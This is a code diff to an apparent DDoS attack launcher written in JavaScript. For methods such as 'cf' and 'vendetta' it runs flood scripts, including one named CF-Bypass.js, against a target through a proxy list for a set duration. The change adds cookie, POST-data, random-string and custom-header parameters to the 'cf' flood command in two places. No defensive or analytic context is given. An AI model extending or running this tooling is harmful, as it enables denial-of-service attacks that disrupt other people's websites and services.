@@ -373,7 +373,7 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
           sigma()
 	  } else if (methods === 'cf') {
        pushOngoing(target, methods, duration)
-	exec(`node ${metode} POST ${target} proxy.txt ${duration} 30 100`)       
+	exec(`node ${metode} POST ${target} proxy.txt ${duration} 30 100 cookie=mycookie postdata="param1=value1&param2=value2" randomstring=randomparam headerdata="Custom-Header=Value"`)       
 	  sigma()
 	  } else if (methods === 'vendetta') {
        pushOngoing(target, methods, duration)
@@ -414,7 +414,7 @@ const vendetta = path.join(__dirname, `/lib/cache/CF-Bypass.js`);
         exec(`node ${mem} ${target} 80 ${duration}`)
 	exec(`node ${kupal} ${target} ${duration} 100 30 proxy.txt --full`)
 	exec(`node ${lol} ${target} ${duration} 30 100 proxy.txt --proxy`)
-	exec(`node ${cf} POST ${target} proxy.txt ${duration} 30 100`)
+	exec(`node ${cf} POST ${target} proxy.txt ${duration} 30 100 cookie=mycookie postdata="param1=value1&param2=value2" randomstring=randomparam headerdata="Custom-Header=Value"`)
 	exec(`node ${vendetta} ${target} ${duration} 30 100 proxy.txt`)
 	
 	
